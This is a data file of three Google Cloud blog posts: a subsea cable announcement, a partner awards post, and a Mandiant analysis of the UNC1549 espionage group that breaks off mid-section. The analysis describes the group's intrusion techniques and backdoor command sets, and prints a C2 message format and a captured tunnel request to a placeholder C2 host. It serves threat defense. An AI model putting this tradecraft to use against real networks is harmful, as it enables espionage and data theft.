[
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/networking/introducing-dhivaru-new-subsea-cable/",
        "title": "Introducing Dhivaru and two new connectivity hubs",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Dhivaru_Map.max-600x600.jpg",
        "author": "Bikash Koley",
        "track": null,
        "description": "<div class=\"block-paragraph\"><p>Today, we\u2019re announcing Dhivaru, a new Trans-Indian Ocean subsea cable system that will connect the Maldives, Christmas Island and Oman. This investment will build on the <a href=\"https://cloud.google.com/blog/products/infrastructure/bosun-australia-connect-initiative-for-indo-pacific-connectivity?e=48754805\">Australia Connect</a> initiative, furthering the reach, reliability, and resilience of digital connectivity across the Indian Ocean.</p><p>Reach, reliability and resilience are integral to the success of AI-driven services for our users and customers. Tremendous adoption of groundbreaking services such as Gemini 2.5 Flash Image (aka Nano Banana) and Vertex AI, mean resilient connectivity has never been more important for our users. The speed of AI adoption is also outpacing anyone\u2019s predictions, and Google is investing to meet this long-term demand.</p><p>\u201cDhivaru\u201d is the line that controls the main sail on traditional Maldivian sailing vessels, and signifies the skill, strength, and experience of the early sailors navigating the seas.</p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Dhivaru_Map\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Dhivaru_Map.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph\"><p>In addition to the cable investment, Google will be investing in creating two new connectivity hubs for the region. The Maldives and Christmas Island are naturally positioned for connectivity hubs to help improve digital connectivity for the region, including Africa, the Middle East, South Asia and Oceania.</p><p><i>\u201cGoogle\u2019s decision to invest in the Maldives is a strong signal of confidence in our country\u2019s stable and open investment environment, and a direct contribution to my vision for a diversified, inclusive, and digitized Maldivian economy. As the world moves rapidly toward an era defined by digital transformation and artificial intelligence, this project reflects how the Maldives is positioning itself at the crossroads of global connectivity \u2014 leveraging our strategic geography to create new economic opportunities for our people and to participate meaningfully in the future of the global economy.\u201d</i> - <b>His Excellency the President of Republic of Maldives</b></p><p><i>\u201cWe are delighted to partner with Google on this landmark initiative to establish a new connectivity hub in the Maldives. This project represents a major step forward in strengthening the nation\u2019s digital infrastructure and enabling the next wave of digital transformation. As a leading digital provider, Ooredoo Maldives continues to expand world-class connectivity and digital services nationwide. This progress opens new opportunities for businesses such as tourism, enabling smarter operations, improved customer experiences and greater global reach. We are proud to be powering the next phase of the Digital Maldives.\"</i><b> - Ooredoo Maldives CEO and MD, Khalid Al Hamadi.</b></p><p><i>\"Dhiraagu is committed to advancing the digital connectivity of the Maldives and empowering our people, communities, and businesses. Over the years, we have made significant investments in building robust subsea cable systems \u2014 transforming the digital landscape \u2014 connecting the Maldives to the rest of the world and enabling the rollout of high-speed broadband across the nation. We are proud and excited to partner with Google on their expansion of subsea infrastructure and the establishment of a new connectivity hub in Addu City, the southernmost city of the Maldives. This strategic collaboration with one of the world\u2019s largest tech players marks another milestone in strengthening the nation\u2019s presence within the global subsea infrastructure, and further enhances the reliability and resiliency of our digital ecosystem.\"</i> -<b> Ismail Rasheed, CEO &amp; MD, DHIRAAGU</b></p></div>\n<div class=\"block-paragraph\"><h3>Connectivity hubs for the Indian Ocean region</h3><p>Connectivity hubs are strategic investments designed to future-proof regional connectivity and accelerate the delivery of next-generation services through three core capabilities: Cable switching, content caching, and colocation.</p><p><b>Cable switching: Delivering seamless resilience</b></p><p>Google carefully selects the locations for our connectivity hubs to minimize the distance data has to travel before it has a chance to \u2018switch paths\u2019.. This capability improves resilience, and ensures robust, high-availability connectivity across the region. The hubs also allow automatic re-routing of traffic between multiple cables. If one cable experiences a fault, traffic will automatically select the next best path and continue on its way. This ensures high availability not only for the host country, but minimizes downtime for services and users across the region.</p><p><b>Content caching: Accelerating digital services</b></p><p>Low latency is critical for optimal user experience. One of Google\u2019s objectives is to serve content from as close to our users and customers as possible. By caching \u2014 storing copies of the most popular content locally \u2014 Google can reduce the latency to retrieve or view this content, improving the quality of services.</p><p><b>Colocation: Fostering a local ecosystem</b></p><p>Connectivity hubs are often in locations where users have limited access to high quality data centers to house their services and IT hardware, such as islands. Although these facilities are not very large as compared to a Google data center, Google understands the benefits of shared infrastructure, and is committed to providing rack space to carriers and local companies.</p><h3>Energy efficiency</h3><p>Subsea cables are very energy efficient. As a result, even when supporting multiple cables, content storage and colocation, a Google connectivity hub requires far less power than a typical data center. They are primarily focused on networking and localized storage and not the large demands supporting AI, cloud and other important building blocks of the Internet. Of course, the power required for a connectivity hub can still be a lot for some smaller locations, and where it is, Google is exploring using its power demand to accelerate local investment in sustainable energy generation, consistent with its long history of stimulating renewable energy solutions.</p><p>These new connectivity hubs in the Maldives and Christmas Island are ideally situated to deepen the resilience of internet infrastructure in the Indian Ocean Region. The facilities will help power our products, strengthen local economies and bring AI benefits to people and businesses around the world. We look forward to announcing future subsea cables and connectivity hubs and further enhancing the Internet\u2019s reach, reliability, and resilience.</p></div>",
        "published_date": "2025-11-17 15:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/partners/2025-google-cloud-partner-all-stars/",
        "title": "Celebrating our 2025 Google Cloud Partner All-stars",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/2025_Partner_All-stars_blog_image.max-600x600.png",
        "author": "Kevin Ichhpurani",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">At Google Cloud, we have the honor of partnering with some of the most brilliant and inventive individuals across the world. Each year, the\u00a0Google Cloud Partner All-stars program\u00a0honors these remarkable people for their dedication to innovation and commitment to excellence. Our 2025 All-stars are pushing our industry forward, and we\u2019re thrilled to celebrate them.</span></p>\n<p><strong style=\"vertical-align: baseline;\">2025 Spotlight: AI Innovation</strong></p>\n<p><span style=\"vertical-align: baseline;\">For 2025, we\u2019re </span><span style=\"vertical-align: baseline;\">excited to introduce a new category that recognizes strategic leaders in enterprise-wide AI adoption. These honorees are trusted advisors, helping customers transform their business using Google AI. This includes implementing agentic AI to transform core processes, create new revenue streams, or redefine operating models.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">These All-stars showcase a holistic vision for how AI</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">integrates i</span><span style=\"vertical-align: baseline;\">nto a customer\u2019s culture and strategy to drive lasting, measurable transformation that fundamentally alters business processes.</span></p>\n<p><strong style=\"vertical-align: baseline;\">What sets Partner All-stars apart? <br /></strong><span style=\"vertical-align: baseline;\">The following qualities define what it means to be a Partner All-star:</span></p>\n<p><strong style=\"vertical-align: baseline;\">AI Innovation</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Guides customers through profound business transformation by driving enterprise-wide AI adoption</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Establishes a strategic vision for integrating AI and autonomous agents into a customer's operating model</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Leverages agentic AI to redefine core processes, create new revenue streams, and transform business outcomes</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Delivers lasting, measurable results that fundamentally alter a customer's business processes</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Delivery Excellence</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Top-ranked personnel on Google Cloud\u2019s Delivery Readiness Portal (DRP)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Displays commitment to technical excellence by passing advanced delivery challenge labs and other advanced technical training</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Demonstrates excellent knowledge and adoption of Google Cloud delivery enablement methods, assets, and offerings</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Exhibits expertise through customer project and deployment experience\u00a0\u00a0</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Marketing</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Drives strategic programs and key events that address customer concerns and priorities</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Works with cross-functional teams to ensure the success of campaigns and events</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Takes a data-driven approach to marketing, investing resources and time in programs that drive the biggest impact</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Always explores areas of opportunity to improve future work</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Sales</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Embodies commitment to the customer transformation journey</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Consistently meets and exceeds sales targets</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Aligns on goals to deliver amazing end-to-end customer experiences\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Prioritizes long-term customer relationships over short-term sales</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Solutions Engineering</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Delivers superior customer experiences by keeping professional skills up to date, earning at least one Google technical certification</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Embraces customer challenges head-on, taking responsibility for end-to-end solutioning</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Works with purpose, providing deliverables in a timely manner without compromising quality\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Works effectively across joint product areas, leveraging technology in innovative ways to address customer needs</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Celebrating excellence in 2025</strong></p>\n<p><span style=\"vertical-align: baseline;\">On behalf of the entire Google Cloud team, I want to extend a much-deserved congratulations to our 2025 Google Cloud Partner All-stars. Their commitment to innovation is an inspiration to us and a driving force of success to our customers.</span></p>\n<p><span style=\"vertical-align: baseline;\">Follow the celebration and engage with #PartnerAllstars on social media to learn more about these exceptional leaders.</span></p>\n<p><span style=\"vertical-align: baseline;\">Learn more about </span><a href=\"https://cloud.google.com/partners\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Partners</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>",
        "published_date": "2025-11-17 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense/",
        "title": "Frontline Intelligence: Analysis of UNC1549 TTPs, Custom Tools, and Malware Targeting the Aerospace and Defense Ecosystem",
        "thumbnail": null,
        "author": "Mandiant",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p>Written by: Mohamed El-Banna, Daniel Lee, Mike Stokkel, Josh Goddard</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Overview</span></h3>\n<p><span style=\"vertical-align: baseline;\">Last year, Mandiant published a </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/suspected-iranian-unc1549-targets-israel-middle-east\"><span style=\"text-decoration: underline; vertical-align: baseline;\">blog post</span></a><span style=\"vertical-align: baseline;\"> highlighting suspected Iran-nexus espionage activity targeting the aerospace, aviation, and defense industries in the Middle East. In this follow-up post, Mandiant discusses additional tactics, techniques, and procedures (TTPs) observed in incidents Mandiant has responded to.</span></p>\n<p><span style=\"vertical-align: baseline;\">Since mid-2024, Mandiant has responded to targeted campaigns by the threat group UNC1549 against the aerospace, aviation and defense industries. To gain initial access into these environments, UNC1549 employed a dual approach: deploying well-crafted phishing campaigns designed to steal credentials or deliver malware and exploiting trusted connections with third-party suppliers and partners.</span></p>\n<p><span style=\"vertical-align: baseline;\">The latter technique is particularly strategic when targeting organizations with high security maturity, such as defense contractors. While these primary targets often invest heavily in robust defenses, their third-party partners may possess less stringent security postures. This disparity provides UNC1549 a path of lesser resistance, allowing them to circumvent the primary target's main security controls by first compromising a connected entity.</span></p>\n<p><span style=\"vertical-align: baseline;\">Operating in late 2023 through 2025, UNC1549 employed sophisticated initial access vectors, including abuse of third-party relationships to gain entry (pivoting from service providers to their customers), VDI breakouts from third parties, and highly targeted, role-relevant phishing.</span></p>\n<p><span style=\"vertical-align: baseline;\">Once inside, the group leverages creative lateral movement techniques, such as stealing victim source code for spear-phishing campaigns that use lookalike domains to bypass proxies, and abusing internal service ticketing systems for credential access. They employ custom tooling, notably DCSYNCER.SLICK\u2014a variant deployed via search order hijacking to conduct DCSync attacks.</span></p>\n<p><span style=\"vertical-align: baseline;\">UNC1549\u2019s campaign is distinguished by its focus on anticipating investigators and ensuring long-term persistence after detection. They plant backdoors that beacon silently for months, only activating them to regain access after the victim has attempted eradication. They maintain stealth and command and control (C2) using extensive reverse SSH shells (which limit forensic evidence) and domains strategically mimicking the victim's industry.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Threat Activity</span></h3>\n<h4><span style=\"vertical-align: baseline;\">Initial Compromise</span></h4>\n<p><span style=\"vertical-align: baseline;\">A primary initial access vector employed by UNC1549 involved combining targeted social engineering with the exploitation of compromised third-party accounts. Leveraging credentials harvested from vendors, partners, or other trusted external entities, UNC1549 exploited legitimate access pathways inherent in these relationships.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Third-Party Services</span></h4>\n<p><span style=\"vertical-align: baseline;\">Notably, the group frequently abused Citrix, VMWare, and Azure Virtual Desktop and Application services provided by victim organizations to third party partners, collaborators, and contractors. Utilizing compromised third-party credentials, they authenticated to the supplier\u2019s infrastructure, establishing an initial foothold within the network perimeter. Post-authentication, UNC1549 used techniques designed to escape the security boundaries and restrictions of the virtualized Citrix session. This breakout granted them access to the underlying host system or adjacent network segments, and enabled the initiation of lateral movement activities deeper within the target corporate network.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Spear Phishing</span></h3>\n<p><span style=\"vertical-align: baseline;\">UNC1549 utilized targeted spear-phishing emails as one of the methods to gain initial network access. These emails used lures related to job opportunities or recruitment efforts, aiming to trick recipients into downloading and running malware hidden in attachments or links. Figure 1 shows a sample phishing email sent to one of the victims.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Screenshot of a phishing email sent by UNC1549\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/unc1549-ttps-fig1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: Screenshot of a phishing email sent by UNC1549</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Following a successful breach, Mandiant observed UNC1549 pivoting to spear-phishing campaigns specifically targeting IT staff and administrators. The goal of this campaign was to obtain credentials with higher permissions. To make these phishing attempts more believable, the attackers often perform reconnaissance first, such as reviewing older emails in already compromised inboxes for legitimate password reset requests or identifying the company's internal password reset webpages, then crafted their malicious emails to mimic these authentic processes.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Establish Foothold</span></h3>\n<p><span style=\"vertical-align: baseline;\">To maintain persistence within compromised networks, UNC1549 deployed several custom backdoors. Beyond MINIBIKE, which Mandiant discussed in the February 2024 blog post, the group also utilizes other custom malware such as TWOSTROKE and DEEPROOT. Significantly, Mandiant's analysis revealed that while the malware used for initial targeting and compromises was not unique, every post-exploitation payload identified, regardless of family, had a unique hash. This included instances where multiple samples of the same backdoor variant were found within the same victim network. This approach highlights UNC1549's sophistication and the considerable effort invested in customizing their tools to evade detection and complicate forensic investigations.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Search Order Hijacking</span></h4>\n<p><span style=\"vertical-align: baseline;\">UNC1549 abused DLL search order hijacking to execute CRASHPAD, DCSYNCER.SLICK, GHOSTLINE, LIGHTRAIL, MINIBIKE, POLLBLEND, SIGHTGRAB, and TWOSTROKE payloads. Using the DLL search order hijacking techniques, UNC1549 achieved a persistent and stealthy way of executing their tooling.</span></p>\n<p><span style=\"vertical-align: baseline;\">Throughout the different investigations, UNC1549 demonstrated a comprehensive understanding of software dependencies by exploiting DLL search order hijacking in multiple software solutions. UNC1549 has deployed malicious binaries targeting legitimate Fortigate, VMWare, Citrix, Microsoft, and NVIDIA executables. In many cases, the threat actor installed the legitimate software after initial access in order to abuse SOH; however, in other cases, the attacker leveraged software that was already installed on victim systems and then replaced or added the malicious DLLs within the legitimate installation directory, typically with SYSTEM privileges.</span></p>\n<h4><span style=\"vertical-align: baseline;\">TWOSTROKE</span></h4>\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE, a C++ backdoor, utilizes SSL-encrypted TCP/443 connections to communicate with its controllers. This malware possesses a diverse command set, allowing for system information collection, DLL loading, file manipulation, and persistence. While showing some similarities to MINIBIKE, it's considered a unique backdoor.</span></p>\n<p><span style=\"vertical-align: baseline;\">Upon execution of TWOSTROKE, it employs a specific routine to generate a unique victim identifier. TWOSTRIKE retrieves the fully qualified DNS computer name using the Windows API function </span><code style=\"vertical-align: baseline;\">GetComputerNameExW(ComputerNameDnsFullyQualified)</code><span style=\"vertical-align: baseline;\">. This retrieved name then undergoes an XOR encryption process, utilizing the static key. Following the encryption, the resulting binary data is converted into a lowercase hexadecimal string.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Finally, TWOSTROKE extracts the first eight characters of this hexadecimal string, reverses it, and uses it as the victim's unique bot ID for later communication with the C2 server.</span></p>\n<h5><span style=\"vertical-align: baseline;\">Functionalities</span></h5>\n<p><span style=\"vertical-align: baseline;\">After sending the check in request to the C2 server, the TWOSTROKE C2 server returns with a hex-encoded payload that contains multiple values separated by \"</span><code style=\"vertical-align: baseline;\">@##@</code><span style=\"vertical-align: baseline;\">.\" Depending on the received command, TWOSTROKE can execute one of the following commands:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">1</code><span style=\"vertical-align: baseline;\">: Upload a file to the C2</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">2</code><span style=\"vertical-align: baseline;\">: Execute a file or a shell command</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">3</code><span style=\"vertical-align: baseline;\">: DLL execution into memory</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">4</code><span style=\"vertical-align: baseline;\">: Download file from the C2</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">5</code><span style=\"vertical-align: baseline;\">: Get the full victim user name</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">6</code><span style=\"vertical-align: baseline;\">: Get the full victim machine name</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">7</code><span style=\"vertical-align: baseline;\">: List a directory</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">8</code><span style=\"vertical-align: baseline;\">: Delete a file</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">LIGHTRAIL</span></h4>\n<p><span style=\"vertical-align: baseline;\">UNC1549 was observed downloading a ZIP file from attacker-owned infrastructure. This ZIP file contained the LIGHTRAIL tunneler as</span> <code style=\"vertical-align: baseline;\">VGAuth.dll</code><span style=\"vertical-align: baseline;\"> and was executed through search order hijacking using the </span><code style=\"vertical-align: baseline;\">VGAuthCLI.exe</code><span style=\"vertical-align: baseline;\"> executable. LIGHTRAIL is a custom tunneler, likely based on the open-source </span><code style=\"vertical-align: baseline;\">Socks4a</code><span style=\"vertical-align: baseline;\"> proxy, </span><a href=\"https://github.com/codewhitesec/Lastenzug\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Lastenzug</span></a><span style=\"vertical-align: baseline;\">, that communicates using Azure cloud infrastructure.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">There are several distinct differences between the LIGHTRAIL sample and the </span><code style=\"vertical-align: baseline;\">LastenZug</code><span style=\"vertical-align: baseline;\"> source code. These include:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Increasing the MAX_CONNECTIONS from 250 to 5000</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Static configuration inside the </span><code style=\"vertical-align: baseline;\">lastenzug</code><span style=\"vertical-align: baseline;\"> function (</span><code style=\"vertical-align: baseline;\">wPath</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">port</code><span style=\"vertical-align: baseline;\">)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">No support for using a proxy server when connecting to the WebSocket C2</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Compiler optimizations reducing the number of functions (26 to 10)</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Additionally, LastenZug is using hashing for DLLs and API function resolving. By default, the hash value is XOR\u2019d with the value </span><code style=\"vertical-align: baseline;\">0x41507712</code>, <span style=\"vertical-align: baseline;\">while the XOR value in the observed LIGHTRAIL sample differs from the original source code - </span><code style=\"vertical-align: baseline;\">0x41424344</code> <span style=\"vertical-align: baseline;\">(</span><code style=\"vertical-align: baseline;\">\u2018ABCD\u2019</code><span style=\"vertical-align: baseline;\">)</span><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">After loading the necessary API function pointers, the initialization continues by populating the server name (</span><code style=\"vertical-align: baseline;\">wServerName</code><span style=\"vertical-align: baseline;\">), the port, and URI (</span><code style=\"vertical-align: baseline;\">wPath</code><span style=\"vertical-align: baseline;\">) values. The port is hardcoded at 443 (for HTTPS) and the path is hardcoded to \"</span><code style=\"vertical-align: baseline;\">/news</code><span style=\"vertical-align: baseline;\">.\" This differs from the source code where these values are input parameters to the </span><code style=\"vertical-align: baseline;\">lastenzug </code><span style=\"vertical-align: baseline;\">function.</span></p>\n<p><span style=\"vertical-align: baseline;\">The </span><code style=\"vertical-align: baseline;\">initWS</code> <span style=\"vertical-align: baseline;\">function is responsible for establishing the WebSocket connection, which it does using the Windows WinHTTP API. The </span><code style=\"vertical-align: baseline;\">initWS</code> <span style=\"vertical-align: baseline;\">function has a hard-coded </span><span style=\"vertical-align: baseline;\">User-Agent</span><span style=\"vertical-align: baseline;\"> string which it constructs as a stack string:</span></p>\n<p><code style=\"vertical-align: baseline;\">Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136</code></p>\n<p><span style=\"vertical-align: baseline;\">Mandiant identified another LIGHTRAIL sample uploaded to </span><a href=\"https://www.virustotal.com/gui/file/b19bdfda0cd8e50f7b5968d39aa31449a9cf9b85b8d7e00e19400cf5734f70bf/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">VirusTotal</span></a><span style=\"vertical-align: baseline;\"> from Germany. However, this sample seems to have been modified by the uploader as the C2 domain was intentionally altered.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>GET https://aaaaaaaaaaaaaaaaaa.bbbbbb.cccccccc.ddddd.com/page HTTP/1.1\nHost: aaaaaaaaaaaaaaaaaa.bbbbbb.cccccccc.ddddd.com\nConnection: Upgrade\nUpgrade: websocket\nUser-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136\nSec-WebSocket-Key: 9MeEoJ3sjbWAEed52LdRdg==\nSec-WebSocket-Version: 13</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 2: Modified LIGHTRAIL network communication snippet</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Most notable is that this sample is using a different URL path for its communication, but also the User-Agent in this sample is different from the one that was observed in previous LIGHTRAIL samples and the LastenZug source code.</span></p>\n<h4><span style=\"vertical-align: baseline;\">DEEPROOT</span></h4>\n<p><span style=\"vertical-align: baseline;\">DEEPROOT is a Linux backdoor written in Golang and supports the following functionalities: shell command execution, system information enumeration and file listing, delete, upload, and download. DEEPROOT was compiled to be operating on Linux systems; however, due to Golang\u2019s architecture DEEPROOT could also be compiled for other operating systems. At the time of writing, Mandiant has not observed any DEEPROOT samples targeting Windows systems.</span></p>\n<p><span style=\"vertical-align: baseline;\">DEEPROOT was observed using multiple C2 domains hosted in Microsoft Azure. The observed DEEPROOT samples used multiple C2 servers per binary, suspected to be used for redundancy in case one C2 server has been taken down.</span></p>\n<h5><span style=\"vertical-align: baseline;\">Functionalities</span></h5>\n<p><span style=\"vertical-align: baseline;\">After sending the check in request to the C2 server, the DEEPROOT C2 server returns with a hex-encoded payload that contains multiple values separated by \u2018</span><code style=\"vertical-align: baseline;\">-===-</code><span style=\"vertical-align: baseline;\">\u2019 </span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>&lt;sleep_timeout&gt;-===-&lt;command_id&gt;-===-&lt;command&gt;-===-&lt;argument_1&gt;-===-&lt;argument_2&gt;</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 3: Decoded POST body data structure</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">sleep_timeout</code><span style=\"vertical-align: baseline;\"> is the time in milli-seconds to wait before making the next request.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">command_id</code><span style=\"vertical-align: baseline;\"> is an identifier for the C2 command, used by the backdoor when responding to the C2 with the result.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">command</code><span style=\"vertical-align: baseline;\"> is the command number and it's one of the following:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">1</code><span style=\"vertical-align: baseline;\"> - Get directory information (directory listing), the directory path is received in </span><code style=\"vertical-align: baseline;\">argument_1</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">2</code><span style=\"vertical-align: baseline;\"> - Delete a file, the file path is received in </span><code style=\"vertical-align: baseline;\">argument_1</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">3</code><span style=\"vertical-align: baseline;\"> - Get the victim username.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">4</code><span style=\"vertical-align: baseline;\"> - Get the victim's hostname.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">5</code><span style=\"vertical-align: baseline;\"> - Execute a shell command, the shell command is received in </span><code style=\"vertical-align: baseline;\">argument_1</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">6</code><span style=\"vertical-align: baseline;\"> - Download a file from the C2, the C2 file path is received in </span><code style=\"vertical-align: baseline;\">argument_1</code><span style=\"vertical-align: baseline;\"> and the local file path is received in </span><code style=\"vertical-align: baseline;\">argument_2</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">7</code><span style=\"vertical-align: baseline;\"> - Upload a file to the C2, the local file path is received in </span><code style=\"vertical-align: baseline;\">argument_1</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">argument_1</span><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">argument_2</code><span style=\"vertical-align: baseline;\"> are the command arguments and it is optional.</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">GHOSTLINE</span></h4>\n<p><span 